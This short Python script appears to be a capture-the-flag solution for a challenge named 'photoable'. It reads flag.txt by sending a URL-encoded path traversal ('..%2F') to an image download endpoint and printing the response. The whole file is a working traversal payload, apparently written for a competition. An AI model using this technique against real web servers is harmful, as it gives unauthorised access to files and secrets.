import urllib.request

# Just a simple little file traversal
BASEHREF = 'https://photoable.tjc.tf'
print(urllib.request.urlopen('{}/image/..%2Fflag.txt/download'.format(BASEHREF)).read().decode('utf-8'))
